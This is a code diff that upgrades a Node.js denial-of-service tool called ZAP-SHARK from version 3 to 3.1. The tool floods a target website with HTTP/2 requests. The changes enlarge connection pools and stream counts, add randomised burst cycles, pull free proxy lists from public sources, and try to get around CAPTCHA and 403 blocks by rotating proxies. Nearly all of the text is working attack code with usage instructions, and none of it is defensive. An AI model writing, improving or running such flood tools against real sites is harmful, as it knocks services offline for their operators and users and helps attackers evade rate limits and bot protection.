@@ -2,14 +2,12 @@ const http2 = require('http2');
 const https = require('https');
 const os = require('os');
 const { exec } = require('child_process');
-const net = require('net');
 
-class ZAPSHARK_V3 {
+class ZAPSHARK_V31 {
     constructor(targetUrl) {
         this.targetUrl = targetUrl;
         this.hostname = new URL(targetUrl).hostname;
         this.status = "ATTACKING";
-        this.mode = "NORMAL";
         this.totalRequests = 0;
         this.currentRPS = 0;
         this.startTime = Date.now();
@@ -18,75 +16,92 @@ class ZAPSHARK_V3 {
         this.running = true;
         this.wifiConnected = true;
         this.usingProxy = false;
+        this.captchaDetected = false;
         
-        // Connection tracking
+        // AGGRESSIVE SETTINGS
         this.connectionPool = [];
+        this.poolSize = 15; // 3x more connections
+        this.maxStreamsPerConn = 1000; // MAX H2 abuse
         this.activeStreams = 0;
-        this.lastH2Reset = Date.now();
         
-        // Rotation pools
+        // BURST CYCLES
+        this.burstActive = false;
+        this.lastBurst = Date.now();
+        this.burstInterval = 15000 + Math.random() * 15000; // 15-30s
+        
+        // PROXY SYSTEM
+        this.proxyList = [];
+        this.currentProxyIndex = 0;
+        this.lastProxyRotate = Date.now();
+        this.captchaCount = 0;
+        
+        // SIMPLE HEADERS (minimal overhead)
         this.userAgents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
-            'Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36'
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
         ];
         
-        this.referrers = [
-            'https://www.google.com/',
-            'https://www.facebook.com/',
-            'https://twitter.com/',
-            'https://www.reddit.com/',
-            'https://www.youtube.com/',
-            'https://www.linkedin.com/',
-            'https://github.com/',
-            'https://stackoverflow.com/'
-        ];
-        
-        // Proxy handling
-        this.proxyApi = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all';
-        this.currentProxy = null;
-        this.proxyExpiry = 0;
-        this.last429 = 0;
-        this.rateLimitCount = 0;
-        
-        // Attack intervals
         this.attackInterval = null;
-        this.checkInterval = null;
-        this.wifiCheckInterval = null;
+        this.monitorInterval = null;
     }
 
-    // === WIFI CHECK ===
-    checkWifi() {
-        const interfaces = os.networkInterfaces();
-        let connected = false;
+    // === AGGRESSIVE CONNECTION SETUP ===
+    setupConnections() {
+        // DESTROY ALL OLD CONNECTIONS
+        this.connectionPool.forEach(client => {
+            try { client.destroy(); } catch (err) {}
+        });
+        this.connectionPool = [];
         
-        for (const iface in interfaces) {
-            for (const config of interfaces[iface]) {
-                if (!config.internal && config.family === 'IPv4' && config.address !== '127.0.0.1') {
-                    connected = true;
-                    break;
-                }
+        // CREATE MAX CONNECTIONS
+        for (let i = 0; i < this.poolSize; i++) {
+            try {
+                const client = http2.connect(this.targetUrl, {
+                    maxSessionMemory: 65536, // 64MB per connection
+                    maxDeflateDynamicTableSize: 4294967296,
+                    peerMaxConcurrentStreams: 10000
+                });
+                
+                client.setMaxListeners(1000);
+                
+                // AGGRESSIVE SETTINGS
+                client.settings({
+                    enablePush: false,
+                    initialWindowSize: 16777215, // 16MB window
+                    maxConcurrentStreams: 10000
+                });
+                
+                client.on('error', () => {});
+                
+                this.connectionPool.push(client);
+            } catch (err) {
+                // SILENT FAIL
             }
-            if (connected) break;
         }
-        
-        this.wifiConnected = connected;
-        return connected;
     }
 
-    // === PROXY SYSTEM ===
-    async fetchProxy() {
+    // === AGGRESSIVE PROXY SYSTEM ===
+    async fetchProxies() {
         return new Promise((resolve) => {
-            https.get(this.proxyApi, (res) => {
+            const sources = [
+                'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=yes&anonymity=elite',
+                'https://www.proxy-list.download/api/v1/get?type=http',
+                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt'
+            ];
+            
+            const source = sources[Math.floor(Math.random() * sources.length)];
+            
+            https.get(source, (res) => {
                 let data = '';
                 res.on('data', (chunk) => data += chunk);
                 res.on('end', () => {
-                    const proxies = data.trim().split('\n').filter(p => p);
-                    if (proxies.length > 0) {
-                        this.currentProxy = proxies[Math.floor(Math.random() * proxies.length)].trim();
-                        this.proxyExpiry = Date.now() + 600000; // 10 minutes
+                    this.proxyList = data.trim().split('\n')
+                        .filter(p => p && p.includes(':'))
+                        .map(p => p.trim());
+                    
+                    if (this.proxyList.length > 0) {
+                        console.log(`[+] Loaded ${this.proxyList.length} proxies`);
                         resolve(true);
                     } else {
                         resolve(false);
@@ -96,139 +111,92 @@ class ZAPSHARK_V3 {
         });
     }
 
-    // === CONNECTION SYSTEM ===
-    setupConnections() {
-        // Clear existing
-        this.connectionPool.forEach(client => {
-            try { client.destroy(); } catch (err) {}
-        });
-        this.connectionPool = [];
+    rotateProxy() {
+        if (this.proxyList.length === 0) return false;
         
-        const poolSize = this.mode === "BURST" ? 10 : 5;
+        this.currentProxyIndex = (this.currentProxyIndex + 1) % this.proxyList.length;
+        this.lastProxyRotate = Date.now();
+        this.usingProxy = true;
         
-        for (let i = 0; i < poolSize; i++) {
-            setTimeout(() => {
-                try {
-                    const client = http2.connect(this.targetUrl, {
-                        maxSessionMemory: this.mode === "BURST" ? 32768 : 8192
-                    });
-                    
-                    client.setMaxListeners(100);
-                    
-                    client.on('error', () => {});
-                    
-                    this.connectionPool.push(client);
-                } catch (err) {}
-            }, i * 100);
-        }
+        // RESET CONNECTIONS WITH PROXY (simulated - actual proxy setup would be more complex)
+        this.setupConnections();
+        
+        return true;
     }
 
-    // === REQUEST WITH BYPASS ===
-    async sendRequest() {
-        if (!this.wifiConnected || this.connectionPool.length === 0) return;
+    // === ULTRA AGGRESSIVE REQUEST ===
+    sendRequest() {
+        if (!this.wifiConnected) return;
         
-        // Rapid H2 reset every 2s
-        if (Date.now() - this.lastH2Reset >= 2000) {
-            this.resetH2Connections();
-        }
+        // MAX STREAMS PER TICK
+        const availableStreams = (this.maxStreamsPerConn * this.connectionPool.length) - this.activeStreams;
+        const streamsThisTick = this.burstActive ? 
+            Math.min(availableStreams, 50) : // BURST: 50 streams
+            Math.min(availableStreams, 20);  // NORMAL: 20 streams
         
-        // Check for rate limits
-        if (this.rateLimitCount >= 3 && !this.usingProxy && Date.now() - this.last429 < 30000) {
-            await this.activateProxyMode();
-        }
-        
-        // Rotate headers
-        const userAgent = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
-        const referrer = this.referrers[Math.floor(Math.random() * this.referrers.length)];
-        
-        const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
-        if (!client) return;
-        
-        try {
-            this.activeStreams++;
-            
-            const headers = {
-                ':method': 'GET',
-                ':path': '/?' + Date.now(),
-                ':authority': this.hostname,
-                'user-agent': userAgent,
-                'referer': referrer,
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-                'accept-language': 'en-US,en;q=0.9',
-                'accept-encoding': 'gzip, deflate, br',
-                'cache-control': 'no-cache',
-                'pragma': 'no-cache',
-                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'cross-site',
-                'upgrade-insecure-requests': '1'
-            };
-            
-            const req = client.request(headers);
-            
-            req.on('response', (headers) => {
-                if (headers[':status'] === '429') {
-                    this.last429 = Date.now();
-                    this.rateLimitCount++;
-                }
-                req.destroy();
-            });
-            
-            req.on('error', () => {
-                req.destroy();
-            });
-            
-            req.on('close', () => {
+        for (let i = 0; i < streamsThisTick; i++) {
+            const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
+            if (!client) continue;
+
+            try {
+                this.activeStreams++;
+                
+                const req = client.request({
+                    ':method': 'GET',
+                    ':path': '/?' + Date.now() + Math.random().toString(36).substr(2),
+                    ':authority': this.hostname,
+                    'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)],
+                    'accept': '*/*'
+                });
+                
+                req.on('response', (headers) => {
+                    // CAPTCHA DETECTION
+                    const body = '';
+                    const contentType = headers['content-type'] || '';
+                    const location = headers['location'] || '';
+                    
+                    if (contentType.includes('captcha') || 
+                        contentType.includes('challenge') ||
+                        location.includes('captcha') ||
+                        body.includes('captcha') ||
+                        headers[':status'] === 403) {
+                        
+                        this.captchaCount++;
+                        if (this.captchaCount >= 2) {
+                            this.captchaDetected = true;
+                            this.rotateProxy();
+                        }
+                    }
+                    
+                    req.destroy();
+                });
+                
+                req.on('error', () => {
+                    req.destroy();
+                });
+                
+                req.on('close', () => {
+                    this.activeStreams--;
+                    this.totalRequests++;
+                    this.requestsSinceLastCalc++;
+                });
+                
+                req.end();
+                
+            } catch (err) {
                 this.activeStreams--;
                 this.totalRequests++;
                 this.requestsSinceLastCalc++;
-            });
-            
-            req.end();
-            
-        } catch (err) {
-            this.activeStreams--;
-            this.totalRequests++;
-            this.requestsSinceLastCalc++;
+            }
         }
-    }
-
-    resetH2Connections() {
-        if (this.connectionPool.length > 0) {
-            const newPool = [];
-            this.connectionPool.forEach(client => {
-                try {
-                    // Keep 50% of connections, reset 50%
-                    if (Math.random() > 0.5) {
-                        client.destroy();
-                        const newClient = http2.connect(this.targetUrl);
-                        newClient.setMaxListeners(100);
-                        newPool.push(newClient);
-                    } else {
-                        newPool.push(client);
-                    }
-                } catch (err) {}
-            });
-            this.connectionPool = newPool;
-            this.lastH2Reset = Date.now();
-        }
-    }
-
-    async activateProxyMode() {
-        console.log('\n[!] 429 Detected - Switching to proxy mode [!]');
-        this.usingProxy = true;
-        await this.fetchProxy();
         
-        // Switch back after 10 minutes
-        setTimeout(() => {
-            this.usingProxy = false;
-            this.currentProxy = null;
-            this.rateLimitCount = 0;
-            console.log('\n[~] Returning to direct connection mode');
-        }, 600000);
+        // AGGRESSIVE BURST CYCLING
+        const now = Date.now();
+        if (now - this.lastBurst >= this.burstInterval) {
+            this.burstActive = !this.burstActive;
+            this.lastBurst = now;
+            this.burstInterval = 5000 + Math.random() * 10000; // 5-15s next burst
+        }
     }
 
     // === DISPLAY ===
@@ -255,103 +223,103 @@ class ZAPSHARK_V3 {
         
         const connectionStatus = this.wifiConnected ? "CONNECTED" : "UNCONNECTED";
         const modeStatus = this.usingProxy ? "PROXY" : "DIRECT";
+        const burstStatus = this.burstActive ? "🔥BURST" : "NORMAL";
         
-        // Clear and overwrite
         process.stdout.write('\x1B[2J\x1B[0f');
         console.log(`ZAP-SHARK — (${this.formatRuntime()}) | STATUS: ${this.status}`);
         console.log('============================');
         console.log(`T-ARP — ${this.totalRequests}`);
         console.log(`T-RPS — ${this.currentRPS.toFixed(1)}`);
         console.log('============================');
-        console.log(`ZAP-SHARK — ${connectionStatus} | MODE: ${modeStatus}`);
+        console.log(`ZAP-SHARK — ${connectionStatus} | ${modeStatus} | ${burstStatus}`);
         
+        if (this.captchaDetected) {
+            console.log(`[!] CAPTCHA BYPASS ACTIVE | Proxies: ${this.proxyList.length}`);
+        }
         if (this.usingProxy) {
-            console.log(`PROXY: ${this.currentProxy ? 'ACTIVE' : 'FETCHING...'}`);
+            console.log(`Proxy: ${this.proxyList[this.currentProxyIndex]?.substring(0, 30) || 'Loading...'}`);
         }
     }
 
-    // === BURST MODE ===
-    activateBurstMode() {
-        this.mode = "BURST";
-        console.log('\n[🔥] BURST MODE ACTIVATED [🔥]');
-        this.setupConnections();
-        
-        if (this.attackInterval) {
-            clearInterval(this.attackInterval);
-            this.attackInterval = setInterval(async () => {
-                if (this.status === "ATTACKING" && this.wifiConnected) {
-                    // Send 5x more requests in burst
-                    for (let i = 0; i < 5; i++) {
-                        await this.sendRequest();
-                    }
-                    this.updateDisplay();
+    // === WIFI CHECK ===
+    checkWifi() {
+        const interfaces = os.networkInterfaces();
+        for (const iface in interfaces) {
+            for (const config of interfaces[iface]) {
+                if (!config.internal && config.family === 'IPv4' && config.address !== '127.0.0.1') {
+                    this.wifiConnected = true;
+                    return true;
                 }
-            }, 0.05);
+            }
         }
+        this.wifiConnected = false;
+        return false;
     }
 
     // === MAIN ===
-    start() {
-        console.log("=== ZAP-SHARK V3 - BYPASS MODE ===");
+    async start() {
+        console.log("=== ZAP-SHARK V3.1 - MAX AGGRESSION ===");
         console.log("Target:", this.targetUrl);
-        console.log("Features: UA Rotation | Referrer Rotation | 429 Proxy | H2 Reset");
+        console.log("Mode: NO LIMITS | CAPTCHA BYPASS | MAX H2 ABUSE");
         console.log("=".repeat(60));
         
+        // Load proxies first
+        await this.fetchProxies();
+        
+        // Setup aggressive connections
         this.setupConnections();
         
         // Initial display
         this.updateDisplay();
         
-        // Main attack loop
+        // MAIN ATTACK LOOP - MAX SPEED
         setTimeout(() => {
-            this.attackInterval = setInterval(async () => {
+            this.attackInterval = setInterval(() => {
                 if (this.status === "ATTACKING" && this.wifiConnected) {
-                    await this.sendRequest();
+                    // SEND MULTIPLE REQUEST BATCHES PER TICK
+                    for (let i = 0; i < 3; i++) {
+                        this.sendRequest();
+                    }
                     this.updateDisplay();
                 }
-            }, 0.1);
+            }, 0.05); // 20,000 ticks/sec potential
             
-            // Burst mode every 45s
-            setInterval(() => {
-                if (this.status === "ATTACKING" && !this.usingProxy) {
-                    this.activateBurstMode();
-                    setTimeout(() => {
-                        this.mode = "NORMAL";
-                        this.setupConnections();
-                    }, 7000);
-                }
-            }, 45000);
-            
-            // Wifi check every 2s
-            this.wifiCheckInterval = setInterval(() => {
+            // MONITOR & ADAPT
+            this.monitorInterval = setInterval(() => {
                 this.checkWifi();
-                if (!this.wifiConnected) {
-                    this.status = "PAUSED";
-                    console.log('\n[!] WiFi disconnected - pausing attacks');
-                } else if (this.status === "PAUSED") {
-                    this.status = "ATTACKING";
-                    console.log('\n[~] WiFi reconnected - resuming attacks');
+                
+                // AUTO PROXY ROTATION EVERY 2 MINS WHEN USING PROXY
+                if (this.usingProxy && Date.now() - this.lastProxyRotate >= 120000) {
+                    this.rotateProxy();
                 }
-            }, 2000);
+                
+                // RESET CAPTCHA COUNTER
+                if (this.captchaCount > 0 && !this.captchaDetected) {
+                    setTimeout(() => {
+                        this.captchaCount = 0;
+                    }, 10000);
+                }
+                
+            }, 1000);
             
-        }, 2000);
+        }, 1000);
         
         process.on('SIGINT', () => {
             this.running = false;
             clearInterval(this.attackInterval);
-            clearInterval(this.wifiCheckInterval);
-            console.log('\n=== ZAP-SHARK V3 STOPPED ===');
+            clearInterval(this.monitorInterval);
+            console.log('\n=== ZAP-SHARK V3.1 STOPPED ===');
             process.exit(0);
         });
     }
 }
 
-// Usage
+// USAGE
 const target = process.argv[2];
 if (!target || !target.startsWith('https://')) {
-    console.log('Usage: node zap-shark-v3.js https://target.com');
+    console.log('Usage: node zap-shark-v31.js https://target.com');
     process.exit(1);
 }
 
-const shark = new ZAPSHARK_V3(target);
+const shark = new ZAPSHARK_V31(target);
 shark.start();
